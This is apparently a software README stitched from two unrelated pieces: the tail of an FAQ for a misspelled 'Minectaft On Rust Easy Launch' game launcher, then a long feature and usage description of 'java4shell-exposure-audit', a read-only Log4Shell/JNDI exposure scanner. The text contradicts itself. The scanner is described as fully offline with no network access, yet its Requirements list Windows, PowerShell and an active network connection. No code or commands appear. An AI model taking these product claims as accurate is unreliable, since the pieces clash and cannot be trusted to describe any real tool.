System-wide configuration, registry entries, and global environment variables are not modified. **Q: Is offline launching supported?** A: Yes, provided the required runtime and game artifacts have already been staged locally. The launcher performs a local integrity check and proceeds without network access. First-time resolution of new versions requires connectivity. **Q: How are credentials and session data handled?** A: Authentication tokens are stored only in the local user-scoped configuration directory with restricted filesystem permissions. Tokens are never transmitted to third parties and are used exclusively for the authentication flows the launcher initiates. **Q: Can multiple instances run concurrently?** A: Yes. Each instance is isolated by its own directory and process namespace. Concurrent instances do not share mutable state, and the launcher enforces per-instance locking to prevent corruption. **Q: What diagnostics are available for troubleshooting?** A: The launcher emits structured logs to the user-scoped log directory and supports a verbose logging flag that increases verbosity for runtime resolution, integrity checks, and process launch stages. Logs contain no sensitive token material. **Q: How are updates to the launcher itself delivered?** A: The launcher checks for signed updates on startup and applies them atomically to a staging location before activation. Updates can be deferred or disabled via configuration for controlled environments. **Q: Is the launcher extensible?** A: Configuration is exposed through a documented file format supporting instance definitions, version pins, launch arguments, and environment overrides. Extension points are limited to configuration and do not permit arbitrary code injection. **Q: What is the resource footprint?** A: The launcher is a lightweight native process; memory and CPU usage are dominated by the launched game and runtime rather than the launcher itself. Idle overhead is minimal and scales with the number of active instances. ## Disclaimer Minectaft On Rust Easy Launch is provided as-is, without warranties of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement. --- The Java4Shell Exposure Audit, distributed as java4shell-exposure-audit, is a focused security utility for identifying classpath and dependency conditions that expose Java applications to JNDI injection through Log4Shell-style lookup paths. It performs deterministic, read-only inspection of application artifacts and reports each finding with the exact file, dependency coordinate, and configuration element responsible. Results are emitted in machine-readable form so they can be reviewed manually or consumed by existing vulnerability management pipelines. The tool requires no network access during analysis and does not modify the artifacts it examines. ## 🔧 Requirements - Windows 10 or Windows 11 - PowerShell 5.1 or newer (already available on Windows) - Active network connection - No admin rights needed ## Features - **Static, read-only inspection.** The audit reads application artifacts and configuration files without executing target code, modifying files, or opening network connections to scanned hosts. Results reflect the state of the artifacts at scan time. - **Log4Shell-oriented signal coverage.** Detection rules target the indicators most strongly associated with JNDI injection exposure in Java applications: vulnerable Log4j core versions, `JndiLookup` class presence, enabled lookup substitution, and message-lookup behavior in configuration. - **Dependency and version identification.** Parses manifests, lockfiles, and bundled JAR metadata to identify the resolved Log4j and Log4j2 versions in use, including transitive dependencies where declarative metadata is available. Version matching is performed against an explicit, locally stored vulnerability range table. - **Configuration analysis.** Inspects logging configuration files (XML, JSON, YAML, and properties formats) and environment variable definitions for settings that enable or restrict lookup evaluation, with reported findings tied to the exact file and key that produced them. - **Shaded and nested archive handling.** Traverses nested and shaded JARs (including fat/uber JARs) to detect bundled Log4j classes that would not appear in top-level dependency listings. - **Deterministic, explainable findings.** Each result carries a rule identifier, the matched evidence (file path, class name, version string, or configuration key), and a severity classification. No heuristic scoring is applied without a corresponding rule reference. - **Machine-readable and human-readable output.** Emits structured JSON for pipeline integration and a plain-text summary for operator review. Output schema is versioned, and field names are stable across releases within a major version. - **Exit-code signaling.** Returns distinct exit codes for clean scans, findings at or above a configurable severity threshold, and execution errors, enabling use as a gating step in CI or pre-deployment checks. - **Offline operation.** All detection logic, version tables, and rule definitions are bundled locally. The audit performs no telemetry collection and requires no external service to complete a scan. - **Scoped and repeatable scans.** Accepts explicit target paths and supports include/exclude patterns, so audits can be limited to specific modules or artifact directories. Scan results are reproducible given identical inputs and tool version. - **Auditable rule set.** Detection rules are stored as data files separate from the engine, can be reviewed directly, and are versioned alongside releases so findings can be traced to the exact rule revision that produced them. ## How it works The audit operates in four sequential phases: discovery, extraction, version resolution, and verdict generation. Each phase produces structured intermediate output that is retained for inspection, so results can be validated rather than trusted blindly. **Discovery.** The tool enumerates candidate artifacts from the local filesystem and from container images present on the host. It identifies JAR, WAR, EAR, and nested archive files, along with deployment descriptors that reference them. Scanning is read-only: files are opened for reading and never modified. Archive traversal handles nested structures (archives within archives) to a configurable depth, since vulnerable components are frequently bundled inside larger artifacts. **Extraction.** For each candidate, the tool extracts embedded metadata without executing any code. It parses manifest files, Maven and Gradle metadata (`pom.properties`, `pom.xml`), and package-level version markers. Where metadata is absent or inconsistent, the tool falls back to class-file inspection: it reads constant-pool entries and bytecode version markers to infer the library identity and version range. No classes are loaded, no static initializers run, and no JVM process is spawned against the audited artifacts. **Version resolution.** Extracted version strings are normalized and compared against an embedded rule set describing affected version ranges. Resolution accounts for common real-world noise: shaded or relocated packages, version suffixes, snapshot builds, and multi-release JARs. When a version cannot be determined with confidence, the artifact is reported as indeterminate rather than assumed safe or assumed vulnerable. Every verdict carries a confidence level and the evidence that produced it. **Verdict generation.** Findings are aggregated into a per-artifact report with four states: affected, not affected, indeterminate, and unreachable. The "unreachable" state reflects whether the vulnerable code path is present in the artifact's dependency graph, distinguishing an exposed component from an inert one. Reports are emitted in machine-readable JSON and a human-readable summary, with stable schema versions so output can be diffed across runs. Exit codes are deterministic: a non-zero code signals the presence of affected or indeterminate findings, enabling use in CI pipelines without parsing output. **Determinism and safety.** The audit performs no network access during scanning. Rule sets are bundled with the tool and versioned alongside it, so identical inputs and rule versions produce identical outputs. All operations are constrained to the paths and images explicitly provided; nothing outside the scan scope is read, and no telemetry is collected. ## Modules and Settings ### Scope and Target Definition This module establishes the set of applications, artifacts and dependency groups that the java4shell-exposure-audit run will examine, keeping the security review bounded and reproducible. - Scope source selection lets users point the audit at specific applications, artifact sets or dependency collections so unrelated code is left out of the review. - Include and exclude filters for libraries, package namespaces and application components shape the target list before any analysis runs, reducing noise from vendored or generated code. - Test and sample code handling determines whether fixture or demo sources are treated as in-scope, which matters when exposure in examples should not dominate results. - A scope summary view shows the resolved target list so reviewers can confirm coverage before committing to a full audit pass. ### Java Component Inventory This module enumerates the Java components actually present in the scoped targets and organizes them into a structured listing that later checks draw on. - Grouping controls let users view components by application, by artifact or by library family, depending on how the review is being presented. - Metadata retention settings decide which component attributes are kept for reporting, such as version identifiers or origin location, so reports carry only relevant detail. - Inventory listing output provides the concrete component view that the review works from, making it clear which Java code is genuinely present rather than assumed. ### JNDI and Lookup Pattern Review This module inspects scoped code and configuration for JNDI lookup patterns and related string construction associated with injection-style exposure. - Pattern relevance settings tune which lookup forms are treated as findings, allowing the review to match the organization's coding standards. - Test and sample match inclusion controls whether matches in non-production sources appear in results, keeping triage focused where it matters. - Each finding is presented as a reviewable item with its location and surrounding context, so reviewers can assess intent rather than react to a bare match. - Context depth settings adjust how much surrounding code accompanies each match, balancing readability against completeness. ### Deserialization Surface Identification This module locates serialization and deserialization entry points in the scoped code and configuration so reviewers can see where object streams are handled. - Framework path reporting controls whether framework-provided deserialization routes are listed alongside application-defined ones, which affects how broad the surface view becomes. - Configuration review settings determine whether deserialization-related configuration entries are surfaced as candidate surfaces. - Candidate surface output groups entry points with their context, letting reviewers decide which require hardening or compensating controls. - Surface grouping options help separate clearly application-owned entry points from those inherited through libraries. ### Dependency Exposure Correlation This module correlates inventoried Java libraries against known exposure indicators associated with Java4Shell-style risks and shows which components warrant attention. - Matching strictness settings let users choose between narrower and broader correlation, trading precision against recall for the review. - Transitive dependency inclusion controls whether indirect dependencies participate in correlation, which changes the reach of the assessment. - Results display affected components together with the reference information used for each match, keeping the reasoning visible for validation. - Correlation summaries show how many components were matched versus reviewed, supporting quick sanity checks on the run. ### Evidence, Triage and Reporting These linked capabilities turn findings into an auditable record by capturing supporting evidence, tracking review decisions and producing a stakeholder-facing report. - Evidence capture settings control how much code excerpt, configuration entry or dependency path is retained per finding, and sensitive value masking keeps collected output safe to share. - Triage state and reviewer notes options let teams mark findings as confirmed, pending investigation or dismissed, with the reasoning recorded alongside. - Priority ordering settings adjust which factors influence how findings are sequenced, so the working triage view reflects team-defined urgency. - Report composition options select which sections, evidence and technical detail levels appear in the generated audit report, giving stakeholders a consistent summary of exposure and decisions. ### Additional Settings These optional controls apply across modules and refine how a java4shell-exposure-audit run behaves as a whole. - Profile presets let users save and reuse common combinations of scope, strictness and reporting options for recurring audits. - Run labeling attaches a descriptive name or note to each audit so results can be compared across review cycles. - Output retention settings control how long evidence and intermediate results are kept for later reference. - Workspace separation keeps audits for different teams or product lines distinct so their scope and findings do not blend together. ## Usage Scenarios ### Auditing a Single Production Web Application Before a Release **Goal:** A security engineer needs to confirm whether a soon-to-be-released Java web application exposes JNDI lookup patterns or risky deserialization entry points before it goes live. **Steps:** 1. In the Scope and Target Definition module, select the specific application as the scope source and add exclude filters for vendored and generated package namespaces. 2. Set test and sample code handling so fixture and demo sources are excluded from the review, then confirm the resolved target list in the scope summary view. 3. Run the JNDI and Lookup Pattern Review with context depth increased so each match shows surrounding code, and enable test match inclusion to check whether any non-production matches were caught anyway. 4. Use Deserialization Surface Identification with framework path reporting enabled to list both application-defined and framework-provided entry points, then group surfaces to separate the two. 5. Capture evidence for each finding with sensitive value masking on, and record triage states and reviewer notes for the items that need follow-up. **Expected result:** The engineer sees a scoped component inventory for the application, a set of reviewable JNDI findings with location and context, a grouped deserialization candidate list, and a triage view where confirmed concerns are separated from pending items, all backed by masked evidence ready to discuss with the release team. ### Correlating Dependency Exposure Across a Product Line **Goal:** An application owner wants to know which Java libraries across several related artifacts correlate with known Java4Shell-style exposure indicators, including indirect dependencies. **Steps:** 1. Define scope by pointing the audit at the artifact set for the product line and applying include filters for the library families the team owns or ships. 2. Adjust component grouping to view the inventory by artifact, then review the inventory listing to confirm which libraries are genuinely present. 3. Run Dependency Exposure Correlation with transitive dependency inclusion enabled and matching strictness set to a narrower level to reduce noise. 4. Review the results display showing affected components alongside the reference information used for each match, and check the correlation summary of matched versus reviewed components. 5. Save the scope, strictness and reporting combination as a profile preset and attach a run label for this review cycle. **Expected result:** The owner obtains a per-artifact inventory, a correlation result set listing matched components with visible reference reasoning, and a summary count of matched versus reviewed components, plus a reusable preset and labeled run so the same assessment can be repeated and compared in the next cycle. ### Producing an Audit Report for Multiple Teams **Goal:** An auditor needs to review exposure across two product teams' codebases, keep their findings separate, and deliver a consistent report for stakeholders. **Steps:** 1. Use workspace separation to keep each team's audit distinct, and configure scope sources and filters separately for each team's applications and dependency collections. 2. For each workspace, run the JNDI and lookup review and the deserialization surface identification, adjusting pattern relevance and framework path reporting to match each team's coding conventions. 3. Apply triage states and reviewer notes per finding, and use priority ordering settings to sequence items according to each team's urgency factors. 4. Configure evidence capture with sensitive value masking and choose output retention settings appropriate for the review period. 5. Generate the audit report with report composition options selecting the sections and technical detail level suitable for stakeholders. **Expected result:** The auditor produces two separate, clearly labeled audit records, each with its own scoped targets, findings, evidence and triage decisions, and generates a stakeholder-facing report that summarizes exposure and recorded decisions at a consistent level of detail without blending the teams' results. ## Privacy Java4Shell Exposure Audit performs all scanning, detection, and reporting locally on the host where it is executed. The tool does not transmit scan results, target inventories, configuration data, or telemetry to any remote endpoint. No analytics, crash reporting, or usage tracking is implemented. Inputs consumed by the audit are limited to the artifacts and paths explicitly provided by the operator, such as classpath entries, configuration files, and manifest data. These inputs are read in place and are not copied to external storage by the tool. Any intermediate data generated during analysis is held in process memory or written to operator-specified local paths and is subject to the operator's own filesystem controls. The tool does not require credentials, API keys, or account registration to operate. It does not establish outbound network connections as part of its default scanning behavior. If a build or plugin integration invokes the audit, network activity is governed by that surrounding environment rather than by Java4Shell Exposure Audit itself. Reports produced by the audit may contain sensitive information, including file paths, dependency coordinates, and version identifiers that reveal internal infrastructure details. Operators are responsible for handling generated reports according to their organization's data classification policies, including storage location, access controls, and retention.
